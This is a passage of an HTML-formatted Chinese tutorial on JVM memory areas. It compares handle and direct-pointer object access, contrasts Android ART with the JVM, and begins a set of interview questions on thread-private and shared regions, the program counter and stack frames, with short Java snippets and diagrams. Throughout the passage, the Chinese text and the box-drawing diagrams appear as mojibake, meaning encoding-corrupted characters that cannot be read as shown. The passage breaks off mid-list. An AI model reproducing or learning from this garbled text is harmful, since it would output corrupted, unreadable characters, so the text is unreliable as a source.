<table><thead><tr><th>ç‰¹æ€§</th><th>å¥æŸ„è®¿é—®</th><th>ç›´æ¥æŒ‡é’ˆè®¿é—®</th></tr></thead><tbody><tr><td><strong>è®¿é—®æ¬¡æ•°</strong></td><td>ä¸¤æ¬¡ï¼ˆå…ˆè®¿é—®å¥æŸ„ï¼Œå†è®¿é—®å¯¹è±¡ï¼‰</td><td>ä¸€æ¬¡ï¼ˆç›´æ¥è®¿é—®å¯¹è±¡ï¼‰</td></tr><tr><td><strong>è®¿é—®é€Ÿåº¦</strong></td><td>è¾ƒæ…¢</td><td>è¾ƒå¿«</td></tr><tr><td><strong>å¼•ç”¨ç¨³å®šæ€§</strong></td><td>å¼•ç”¨ä¸å˜ï¼Œå¯¹è±¡ç§»åŠ¨åªéœ€æ›´æ–°å¥æŸ„</td><td>å¼•ç”¨ç›´æ¥æŒ‡å‘å¯¹è±¡</td></tr><tr><td><strong>GCå¼€é”€</strong></td><td>è¾ƒå°ï¼ˆåªéœ€ç§»åŠ¨å¯¹è±¡ï¼Œæ›´æ–°å¥æŸ„ï¼‰</td><td>è¾ƒå¤§ï¼ˆéœ€è¦æ›´æ–°æ‰€æœ‰å¼•ç”¨ï¼‰</td></tr><tr><td><strong>å†…å­˜å ç”¨</strong></td><td>è¾ƒå¤§ï¼ˆéœ€è¦é¢å¤–çš„å¥æŸ„æ± ï¼‰</td><td>è¾ƒå°ï¼ˆä¸éœ€è¦å¥æŸ„æ± ï¼‰</td></tr></tbody></table>
<p><strong>HotSpotä¸ºä»€ä¹ˆä½¿ç”¨ç›´æ¥æŒ‡é’ˆè®¿é—®ï¼Ÿ</strong></p>
<p>HotSpotè™šæ‹Ÿæœºä½¿ç”¨ç›´æ¥æŒ‡é’ˆè®¿é—®ï¼Œä¸»è¦åŸå› ï¼š</p>
<ol>
<li><strong>æ€§èƒ½ä¼˜å…ˆ</strong>ï¼šç›´æ¥è®¿é—®é€Ÿåº¦å¿«ï¼Œå‡å°‘é—´æ¥è®¿é—®å¼€é”€</li>
<li><strong>å¯¹è±¡ç§»åŠ¨è¾ƒå°‘</strong>ï¼šç°ä»£GCç®—æ³•ï¼ˆå¦‚G1ï¼‰å¯ä»¥æ›´å¥½åœ°å¤„ç†å¯¹è±¡ç§»åŠ¨</li>
<li><strong>ç®€å•é«˜æ•ˆ</strong>ï¼šå®ç°ç®€å•ï¼Œè®¿é—®æ•ˆç‡é«˜</li>
</ol>
<p><strong>å®é™…åº”ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AccessExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
        
        <span class="hljs-comment">// HotSpotä½¿ç”¨ç›´æ¥æŒ‡é’ˆè®¿é—®ï¼š</span>
        <span class="hljs-comment">// 1. objå¼•ç”¨ç›´æ¥æŒ‡å‘å †ä¸­çš„å¯¹è±¡</span>
        <span class="hljs-comment">// 2. é€šè¿‡å¯¹è±¡å¤´ä¸­çš„ç±»å‹æŒ‡é’ˆæ‰¾åˆ°ç±»ä¿¡æ¯</span>
        <span class="hljs-comment">// 3. è®¿é—®å¯¹è±¡æ—¶åªéœ€è¦ä¸€æ¬¡å†…å­˜è®¿é—®</span>
        
        obj.toString();  <span class="hljs-comment">// ç›´æ¥é€šè¿‡å¼•ç”¨è®¿é—®å¯¹è±¡ï¼Œæ•ˆç‡é«˜</span>
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-80">ç¬¬äº”éƒ¨åˆ†ï¼šAndroidè¯´æ˜ï¼ˆç®€è¦ï¼‰</h2>
<h3 data-id="heading-81">13. Androidä¸JVMçš„åŒºåˆ«è¯´æ˜</h3>
<h4 data-id="heading-82">13.1 é‡è¦è¯´æ˜</h4>
<p><strong>Androidå¼€å‘è¯­è¨€ï¼š</strong></p>
<ul>
<li>Androidå¼€å‘ä½¿ç”¨Javaè¯­è¨€ï¼ˆæˆ–Kotlinè¯­è¨€ï¼‰</li>
<li>è¯­æ³•å’ŒJavaç›¸åŒ</li>
</ul>
<p><strong>Androidè¿è¡Œæ—¶ï¼š</strong></p>
<ul>
<li>Androidè¿è¡Œåœ¨ARTï¼ˆAndroid Runtimeï¼‰ä¸Šï¼Œ<strong>ä¸æ˜¯JVM</strong></li>
<li>ARTä¸JVMæ˜¯ä¸¤ä¸ªä¸åŒçš„è¿è¡Œæ—¶ç¯å¢ƒ</li>
</ul>
<p><strong>å…³é”®åŒºåˆ«ï¼š</strong></p>






























<table><thead><tr><th>ç‰¹æ€§</th><th>JVM</th><th>ART</th></tr></thead><tbody><tr><td><strong>ç¼–è¯‘æ–¹å¼</strong></td><td>è§£é‡Šæ‰§è¡Œ + JITç¼–è¯‘</td><td>AOTç¼–è¯‘ + JITç¼–è¯‘ï¼ˆAndroid 7.0+ï¼‰</td></tr><tr><td><strong>å†…å­˜ç®¡ç†</strong></td><td>JVMå†…å­˜åŒºåŸŸï¼ˆå †ã€æ ˆç­‰ï¼‰</td><td>ARTæœ‰è‡ªå·±çš„å†…å­˜ç®¡ç†æœºåˆ¶</td></tr><tr><td><strong>åƒåœ¾å›æ”¶</strong></td><td>JVMçš„GCç®—æ³•</td><td>ARTçš„GCç®—æ³•</td></tr><tr><td><strong>å‚æ•°è°ƒä¼˜</strong></td><td>JVMå‚æ•°ï¼ˆ-Xmxç­‰ï¼‰</td><td>ARTå‚æ•°ï¼ˆä¸åŒçš„å‚æ•°ï¼‰</td></tr></tbody></table>
<p><strong>é‡è¦ç»“è®ºï¼š</strong></p>
<ul>
<li>JVMå†…å­˜å‚æ•°è°ƒä¼˜<strong>ä¸é€‚ç”¨äºAndroidå¼€å‘</strong></li>
<li>Androidå¼€å‘éœ€è¦äº†è§£ARTçš„å†…å­˜ç®¡ç†æœºåˆ¶</li>
<li>è™½ç„¶è¯­æ³•ç›¸åŒï¼Œä½†è¿è¡Œæ—¶ç¯å¢ƒå®Œå…¨ä¸åŒ</li>
</ul>
<h4 data-id="heading-83">13.2 ARTä¸JVMçš„ä¸»è¦åŒºåˆ«ï¼ˆç®€è¦ï¼‰</h4>
<p><strong>1. ç¼–è¯‘æ–¹å¼ä¸åŒï¼š</strong></p>
<ul>
<li><strong>JVM</strong>ï¼šè§£é‡Šæ‰§è¡Œå­—èŠ‚ç  + JITç¼–è¯‘çƒ­ç‚¹ä»£ç </li>
<li><strong>ART</strong>ï¼šAOTï¼ˆAhead-Of-Timeï¼‰ç¼–è¯‘ï¼Œå®‰è£…æ—¶ç¼–è¯‘ä¸ºæœºå™¨ç </li>
</ul>
<p><strong>2. å†…å­˜ç®¡ç†ä¸åŒï¼š</strong></p>
<ul>
<li><strong>JVM</strong>ï¼šä½¿ç”¨æœ¬æ–‡ä»‹ç»çš„JVMå†…å­˜åŒºåŸŸæ¨¡å‹</li>
<li><strong>ART</strong>ï¼šæœ‰è‡ªå·±çš„å†…å­˜ç®¡ç†æœºåˆ¶ï¼Œä¸å®Œå…¨ç­‰åŒäºJVM</li>
</ul>
<p><strong>3. åƒåœ¾å›æ”¶ä¸åŒï¼š</strong></p>
<ul>
<li><strong>JVM</strong>ï¼šå¤šç§GCç®—æ³•å’Œæ”¶é›†å™¨ï¼ˆSerialã€Parallelã€CMSã€G1ç­‰ï¼‰</li>
<li><strong>ART</strong>ï¼šä½¿ç”¨è‡ªå·±çš„GCç®—æ³•ï¼ˆå¹¶å‘æ ‡è®°æ¸…é™¤ç­‰ï¼‰</li>
</ul>
<h4 data-id="heading-84">13.3 ä¸ºä»€ä¹ˆéœ€è¦äº†è§£è¿™ä¸ªåŒºåˆ«</h4>
<p><strong>å­¦ä¹ ç›®çš„ï¼š</strong></p>
<ol>
<li><strong>ç†è§£Androidå’Œä¼ ç»ŸJavaåº”ç”¨çš„åŒºåˆ«</strong></li>
<li><strong>çŸ¥é“JVMå†…å­˜æ¨¡å‹ä¸»è¦é€‚ç”¨äºä¼ ç»ŸJavaåº”ç”¨</strong></li>
<li><strong>Androidå¼€å‘éœ€è¦äº†è§£ARTçš„å†…å­˜ç®¡ç†ï¼Œè€Œä¸æ˜¯JVM</strong></li>
</ol>
<p><strong>å®é™…åº”ç”¨ï¼š</strong></p>
<ul>
<li>å¦‚æœæ˜¯ä¼ ç»ŸJavaåº”ç”¨å¼€å‘ï¼Œå­¦ä¹ JVMå†…å­˜æ¨¡å‹</li>
<li>å¦‚æœæ˜¯Androidå¼€å‘ï¼Œéœ€è¦å­¦ä¹ ARTçš„å†…å­˜ç®¡ç†æœºåˆ¶</li>
<li>ä¸¤è€…è™½ç„¶æœ‰ç›¸ä¼¼ä¹‹å¤„ï¼Œä½†æ˜¯ä¸åŒçš„æŠ€æœ¯æ ˆ</li>
</ul>
<hr/>
<h2 data-id="heading-85">ç¬¬å…­éƒ¨åˆ†ï¼šé¢è¯•é¢˜</h2>
<h3 data-id="heading-86">14. JVMå†…å­˜åŒºåŸŸé¢è¯•é¢˜</h3>
<h4 data-id="heading-87">14.1 åŸºç¡€æ¦‚å¿µé¢˜</h4>
<p><strong>1. JVMå†…å­˜åŒºåŸŸæœ‰å“ªäº›ï¼Ÿè¯·ç”»å‡ºæ•´ä½“æ¶æ„å›¾</strong></p>
<p>JVMå†…å­˜åŒºåŸŸåŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>çº¿ç¨‹ç§æœ‰åŒºåŸŸ</strong>ï¼šç¨‹åºè®¡æ•°å™¨ã€è™šæ‹Ÿæœºæ ˆã€æœ¬åœ°æ–¹æ³•æ ˆ</li>
<li><strong>çº¿ç¨‹å…±äº«åŒºåŸŸ</strong>ï¼šJavaå †ã€æ–¹æ³•åŒº</li>
<li><strong>ç›´æ¥å†…å­˜</strong>ï¼šå †å¤–å†…å­˜ï¼ŒNIOä½¿ç”¨</li>
</ul>
<p>æ•´ä½“æ¶æ„å›¾ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">JVMå†…å­˜åŒºåŸŸæ•´ä½“æ¶æ„ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç¨‹åºè®¡æ•°å™¨ (ç§æœ‰)   â”‚
â”‚  è™šæ‹Ÿæœºæ ˆ (ç§æœ‰)     â”‚
â”‚  æœ¬åœ°æ–¹æ³•æ ˆ (ç§æœ‰)   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    Javaå † (å…±äº«)     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚æ–°ç”Ÿä»£â”‚  â”‚è€å¹´ä»£â”‚  â”‚
â”‚  â”‚ Eden â”‚  â”‚     â”‚  â”‚
â”‚  â”‚ S0S1 â”‚  â”‚     â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”˜  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   æ–¹æ³•åŒº (å…±äº«)      â”‚
â”‚  è¿è¡Œæ—¶å¸¸é‡æ±         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   ç›´æ¥å†…å­˜ (å †å¤–)    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>2. å“ªäº›åŒºåŸŸæ˜¯çº¿ç¨‹å…±äº«çš„ï¼Ÿå“ªäº›æ˜¯çº¿ç¨‹ç§æœ‰çš„ï¼Ÿ</strong></p>
<ul>
<li><strong>çº¿ç¨‹ç§æœ‰åŒºåŸŸ</strong>ï¼šç¨‹åºè®¡æ•°å™¨ã€è™šæ‹Ÿæœºæ ˆã€æœ¬åœ°æ–¹æ³•æ ˆ</li>
<li><strong>çº¿ç¨‹å…±äº«åŒºåŸŸ</strong>ï¼šJavaå †ã€æ–¹æ³•åŒº</li>
</ul>
<p><strong>3. çº¿ç¨‹ç§æœ‰åŒºåŸŸå’Œå…±äº«åŒºåŸŸçš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<p>ä¸»è¦åŒºåˆ«ï¼š</p>













































<table><thead><tr><th>ç‰¹æ€§</th><th>çº¿ç¨‹ç§æœ‰åŒºåŸŸ</th><th>çº¿ç¨‹å…±äº«åŒºåŸŸ</th></tr></thead><tbody><tr><td><strong>ç”Ÿå‘½å‘¨æœŸ</strong></td><td>ä¸çº¿ç¨‹ç›¸åŒï¼Œçº¿ç¨‹åˆ›å»ºæ—¶åˆ›å»ºï¼Œçº¿ç¨‹é”€æ¯æ—¶é”€æ¯</td><td>ä¸JVMç›¸åŒï¼ŒJVMå¯åŠ¨æ—¶åˆ›å»ºï¼ŒJVMå…³é—­æ—¶é”€æ¯</td></tr><tr><td><strong>è®¿é—®æ–¹å¼</strong></td><td>çº¿ç¨‹ç‹¬ç«‹è®¿é—®ï¼Œæ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·±çš„åŒºåŸŸ</td><td>æ‰€æœ‰çº¿ç¨‹å…±äº«è®¿é—®åŒä¸€ä¸ªåŒºåŸŸ</td></tr><tr><td><strong>çº¿ç¨‹å®‰å…¨</strong></td><td>å¤©ç„¶çº¿ç¨‹å®‰å…¨ï¼Œæ— éœ€åŒæ­¥æœºåˆ¶</td><td>éœ€è¦åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨</td></tr><tr><td><strong>å­˜å‚¨å†…å®¹</strong></td><td>å±€éƒ¨å˜é‡ã€æ–¹æ³•å‚æ•°ã€è¿”å›å€¼ç­‰</td><td>å¯¹è±¡å®ä¾‹ã€ç±»ä¿¡æ¯ã€å¸¸é‡ç­‰</td></tr><tr><td><strong>å†…å­˜å ç”¨</strong></td><td>ä¸çº¿ç¨‹æ•°æˆæ­£æ¯”ï¼ˆæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰æ ˆï¼‰</td><td>ä¸å¯¹è±¡æ•°ç›¸å…³ï¼Œä¸çº¿ç¨‹æ•°æ— å…³</td></tr><tr><td><strong>GCå½±å“</strong></td><td>ä¸æ¶‰åŠGCï¼Œçº¿ç¨‹é”€æ¯æ—¶è‡ªåŠ¨å›æ”¶</td><td>GCçš„ä¸»è¦åŒºåŸŸï¼Œéœ€è¦åƒåœ¾å›æ”¶</td></tr><tr><td><strong>è®¿é—®é€Ÿåº¦</strong></td><td>å¿«é€Ÿï¼Œæ— éœ€åŒæ­¥ï¼Œç›´æ¥è®¿é—®</td><td>éœ€è¦åŒæ­¥ï¼Œå¯èƒ½è¾ƒæ…¢</td></tr></tbody></table>
<p><strong>å…³é”®åŒºåˆ«æ€»ç»“ï¼š</strong></p>
<ol>
<li><strong>ç”Ÿå‘½å‘¨æœŸ</strong>ï¼šç§æœ‰åŒºåŸŸéšçº¿ç¨‹ï¼Œå…±äº«åŒºåŸŸéšJVM</li>
<li><strong>çº¿ç¨‹å®‰å…¨</strong>ï¼šç§æœ‰åŒºåŸŸå¤©ç„¶å®‰å…¨ï¼Œå…±äº«åŒºåŸŸéœ€è¦åŒæ­¥</li>
<li><strong>GCå½±å“</strong>ï¼šç§æœ‰åŒºåŸŸä¸æ¶‰åŠGCï¼Œå…±äº«åŒºåŸŸæ˜¯GCçš„ä¸»è¦åŒºåŸŸ</li>
<li><strong>è®¿é—®é€Ÿåº¦</strong>ï¼šç§æœ‰åŒºåŸŸå¿«é€Ÿï¼Œå…±äº«åŒºåŸŸéœ€è¦åŒæ­¥</li>
</ol>
<p><strong>4. ä¸ºä»€ä¹ˆéœ€è¦åŒºåˆ†çº¿ç¨‹ç§æœ‰åŒºåŸŸå’Œå…±äº«åŒºåŸŸï¼Ÿ</strong></p>
<p>ä¸»è¦è®¾è®¡åŸå› ï¼š</p>
<ol>
<li>
<p><strong>æ€§èƒ½è€ƒè™‘</strong></p>
<ul>
<li>ç§æœ‰åŒºåŸŸï¼šè®¿é—®å¿«é€Ÿï¼Œæ— éœ€åŒæ­¥æœºåˆ¶ï¼Œæé«˜æ‰§è¡Œæ•ˆç‡</li>
<li>å…±äº«åŒºåŸŸï¼šç»Ÿä¸€ç®¡ç†ï¼Œå‡å°‘å†…å­˜å ç”¨ï¼Œæé«˜å†…å­˜åˆ©ç”¨ç‡</li>
</ul>
</li>
<li>
<p><strong>çº¿ç¨‹å®‰å…¨</strong></p>
<ul>
<li>ç§æœ‰åŒºåŸŸï¼šå¤©ç„¶çº¿ç¨‹å®‰å…¨ï¼Œé¿å…æ•°æ®ç«äº‰ï¼Œç®€åŒ–ç¼–ç¨‹</li>
<li>å…±äº«åŒºåŸŸï¼šéœ€è¦åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œä½†å…è®¸çº¿ç¨‹é—´é€šä¿¡</li>
</ul>
</li>
<li>
<p><strong>å†…å­˜ç®¡ç†</strong></p>
<ul>
<li>ç§æœ‰åŒºåŸŸï¼šéšçº¿ç¨‹é”€æ¯è‡ªåŠ¨å›æ”¶ï¼Œç®¡ç†ç®€å•</li>
<li>å…±äº«åŒºåŸŸï¼šéœ€è¦GCç»Ÿä¸€ç®¡ç†ï¼Œç”Ÿå‘½å‘¨æœŸé•¿</li>
</ul>
</li>
<li>
<p><strong>æ•°æ®éš”ç¦»</strong></p>
<ul>
<li>ç§æœ‰åŒºåŸŸï¼šçº¿ç¨‹é—´æ•°æ®éš”ç¦»ï¼Œé¿å…ç›¸äº’å¹²æ‰°</li>
<li>å…±äº«åŒºåŸŸï¼šå…è®¸çº¿ç¨‹é—´æ•°æ®å…±äº«å’Œé€šä¿¡ï¼Œå®ç°åä½œ</li>
</ul>
</li>
</ol>
<p><strong>å®é™…å¥½å¤„ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç§æœ‰åŒºåŸŸï¼šæ— éœ€åŒæ­¥ï¼Œæ€§èƒ½å¥½</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">local</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// åœ¨æ ˆä¸­ï¼Œçº¿ç¨‹ç§æœ‰ï¼Œæ— éœ€åŒæ­¥</span>
    local++;  <span class="hljs-comment">// å¿«é€Ÿï¼Œæ— éœ€åŠ é”</span>
}

<span class="hljs-comment">// å…±äº«åŒºåŸŸï¼šéœ€è¦åŒæ­¥ï¼Œä½†å…è®¸çº¿ç¨‹é—´é€šä¿¡</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">shared</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// åœ¨å †ä¸­ï¼Œçº¿ç¨‹å…±äº«</span>

<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    shared++;  <span class="hljs-comment">// éœ€è¦åŒæ­¥ï¼Œä½†å…è®¸å¤šä¸ªçº¿ç¨‹åä½œ</span>
}
</code></pre>
<p><strong>5. çº¿ç¨‹ç§æœ‰åŒºåŸŸå’Œå…±äº«åŒºåŸŸå„è‡ªçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<ul>
<li><strong>ç§æœ‰åŒºåŸŸçš„ä½œç”¨</strong>ï¼šå­˜å‚¨çº¿ç¨‹ç§æœ‰æ•°æ®ã€è®°å½•æ‰§è¡ŒçŠ¶æ€ã€ä¿è¯çº¿ç¨‹å®‰å…¨</li>
<li><strong>å…±äº«åŒºåŸŸçš„ä½œç”¨</strong>ï¼šå­˜å‚¨å…±äº«æ•°æ®ã€çº¿ç¨‹é—´é€šä¿¡ã€èµ„æºå…±äº«</li>
</ul>
<p><strong>6. æ•°æ®æ˜¯å¦‚ä½•åœ¨ç§æœ‰åŒºåŸŸå’Œå…±äº«åŒºåŸŸä¹‹é—´æµè½¬çš„ï¼Ÿ</strong></p>
<p>æ•°æ®æµè½¬çš„å®Œæ•´è¿‡ç¨‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> è¯»å–å¼•ç”¨ï¼šå †(å…±äº«) â†’ æ ˆ(ç§æœ‰)
   çº¿ç¨‹ä»å †ä¸­è¯»å–å¯¹è±¡å¼•ç”¨ï¼Œå­˜å‚¨åˆ°æ ˆçš„å±€éƒ¨å˜é‡è¡¨ä¸­

<span class="hljs-bullet">2.</span> æ“ä½œå¼•ç”¨ï¼šåœ¨æ ˆä¸­æ“ä½œå¯¹è±¡å¼•ç”¨
   çº¿ç¨‹åœ¨æ ˆä¸­å¯¹å¼•ç”¨è¿›è¡Œæ“ä½œï¼ˆèµ‹å€¼ã€ä¼ é€’ç­‰ï¼‰

<span class="hljs-bullet">3.</span> è®¿é—®å¯¹è±¡ï¼šæ ˆ(ç§æœ‰) â†’ å †(å…±äº«)
   çº¿ç¨‹é€šè¿‡æ ˆä¸­çš„å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡

<span class="hljs-bullet">4.</span> ä¿®æ”¹å¯¹è±¡ï¼šä¿®æ”¹å †ä¸­çš„å¯¹è±¡ï¼ˆéœ€è¦åŒæ­¥ï¼‰
   å¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€ä¸ªå¯¹è±¡æ—¶éœ€è¦åŒæ­¥æœºåˆ¶
</code></pre>
<p><strong>å®é™…ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataFlow</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">shared</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// åœ¨å †ä¸­ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ­¥éª¤1ï¼šä»å †è¯»å–å¼•ç”¨åˆ°æ ˆ</span>
        <span class="hljs-type">DataFlow</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>;  <span class="hljs-comment">// objå¼•ç”¨åœ¨æ ˆä¸­ï¼ŒæŒ‡å‘å †ä¸­çš„å¯¹è±¡</span>
        
        <span class="hljs-comment">// æ­¥éª¤2ï¼šåœ¨æ ˆä¸­æ“ä½œå¼•ç”¨</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">local</span> <span class="hljs-operator">=</span> obj.shared;  <span class="hljs-comment">// é€šè¿‡å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡</span>
        
        <span class="hljs-comment">// æ­¥éª¤3ï¼šä¿®æ”¹å †ä¸­çš„å¯¹è±¡ï¼ˆéœ€è¦åŒæ­¥ï¼‰</span>
        <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
            obj.shared = <span class="hljs-number">100</span>;  <span class="hljs-comment">// ä¿®æ”¹å †ä¸­çš„å…±äº«å˜é‡</span>
        }
    }
}
</code></pre>
<p><strong>7. ç¨‹åºè®¡æ•°å™¨çš„ä½œç”¨å’Œç‰¹ç‚¹ï¼Ÿ</strong></p>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ul>
<li>è®°å½•å½“å‰çº¿ç¨‹æ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤åœ°å€</li>
<li>çº¿ç¨‹ç§æœ‰ï¼Œæ¯ä¸ªçº¿ç¨‹ç‹¬ç«‹</li>
<li>åˆ†æ”¯ã€å¾ªç¯ã€è·³è½¬ã€å¼‚å¸¸å¤„ç†ã€çº¿ç¨‹æ¢å¤ç­‰éƒ½éœ€è¦ä¾èµ–ç¨‹åºè®¡æ•°å™¨</li>
</ul>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ol>
<li>
<p><strong>å”¯ä¸€ä¸ä¼šå‘ç”ŸOutOfMemoryErrorçš„åŒºåŸŸ</strong></p>
<ul>
<li>ç¨‹åºè®¡æ•°å™¨å ç”¨çš„å†…å­˜å¾ˆå°ï¼Œå‡ ä¹å¯ä»¥å¿½ç•¥</li>
<li>ä¸ä¼šå› ä¸ºç¨‹åºè®¡æ•°å™¨çš„åŸå› å¯¼è‡´å†…å­˜æº¢å‡º</li>
</ul>
</li>
<li>
<p><strong>çº¿ç¨‹ç§æœ‰</strong></p>
<ul>
<li>æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„ç¨‹åºè®¡æ•°å™¨</li>
<li>çº¿ç¨‹ä¹‹é—´äº’ä¸å½±å“</li>
</ul>
</li>
<li>
<p><strong>æ‰§è¡ŒNativeæ–¹æ³•æ—¶å€¼ä¸ºç©º</strong></p>
<ul>
<li>æ‰§è¡ŒJavaæ–¹æ³•æ—¶ï¼Œè®°å½•å­—èŠ‚ç æŒ‡ä»¤åœ°å€</li>
<li>æ‰§è¡ŒNativeæ–¹æ³•æ—¶ï¼Œå€¼ä¸ºç©ºï¼ˆundefinedï¼‰</li>
</ul>
</li>
</ol>
<p><strong>å®é™…åº”ç”¨ï¼š</strong></p>
<ul>
<li>çº¿ç¨‹åˆ‡æ¢æ—¶ä¿å­˜å’Œæ¢å¤æ‰§è¡Œä½ç½®</li>
<li>åˆ†æ”¯ã€å¾ªç¯ã€å¼‚å¸¸å¤„ç†ç­‰æ§åˆ¶æµçš„åŸºç¡€</li>
</ul>
<p><strong>8. Javaè™šæ‹Ÿæœºæ ˆçš„ä½œç”¨å’Œç»“æ„ï¼Ÿè¯·ç”»å‡ºæ ˆå¸§ç»“æ„å›¾</strong></p>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ul>
<li>å­˜å‚¨å±€éƒ¨å˜é‡ã€æ–¹æ³•å‚æ•°ã€è¿”å›å€¼ã€ä¸­é—´ç»“æœç­‰</li>
<li>æ¯ä¸ªæ–¹æ³•å¯¹åº”ä¸€ä¸ªæ ˆå¸§</li>
<li>çº¿ç¨‹ç§æœ‰</li>
</ul>
<p><strong>æ ˆå¸§ç»“æ„å›¾ï¼š</strong></p>
<pre><code class="hljs">æ ˆå¸§ç»“æ„ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ å±€éƒ¨å˜é‡è¡¨   â”‚ - å­˜å‚¨æ–¹æ³•å‚æ•°å’Œå±€éƒ¨å˜é‡
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ æ“ä½œæ•°æ ˆ     â”‚ - ç”¨äºè®¡ç®—å’Œä¸´æ—¶å­˜å‚¨
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ åŠ¨æ€é“¾æ¥     â”‚ - æŒ‡å‘è¿è¡Œæ—¶å¸¸é‡æ± çš„æ–¹æ³•å¼•ç”¨
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ æ–¹æ³•è¿”å›åœ°å€ â”‚ - æ–¹æ³•æ­£å¸¸è¿”å›æˆ–å¼‚å¸¸è¿”å›çš„åœ°å€
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>æ ˆå¸§å„éƒ¨åˆ†è¯´æ˜ï¼š</strong></p>
<ol>
<li><strong>å±€éƒ¨å˜é‡è¡¨</strong>ï¼šå­˜å‚¨æ–¹æ³•å‚æ•°å’Œå±€éƒ¨å˜é‡ï¼ˆåŸºæœ¬æ•°æ®ç±»å‹å’Œå¯¹è±¡å¼•ç”¨ï¼‰</li>
<li><strong>æ“ä½œæ•°æ ˆ</strong>ï¼šç”¨äºè®¡ç®—å’Œä¸´æ—¶å­˜å‚¨ï¼ŒLIFOç»“æ„</li>
<li><strong>åŠ¨æ€é“¾æ¥</strong>ï¼šæŒ‡å‘è¿è¡Œæ—¶å¸¸é‡æ± çš„æ–¹æ³•å¼•ç”¨ï¼Œæ”¯æŒå¤šæ€</li>
<li><strong>æ–¹æ³•è¿”å›åœ°å€</strong>ï¼šæ–¹æ³•é€€å‡ºåè¿”å›åˆ°å“ªæ¡æŒ‡ä»¤ç»§ç»­æ‰§è¡Œ</li>
</ol>
<p><strong>9. æ ˆå¸§åŒ…å«å“ªäº›éƒ¨åˆ†ï¼Ÿ</strong></p>
<ul>
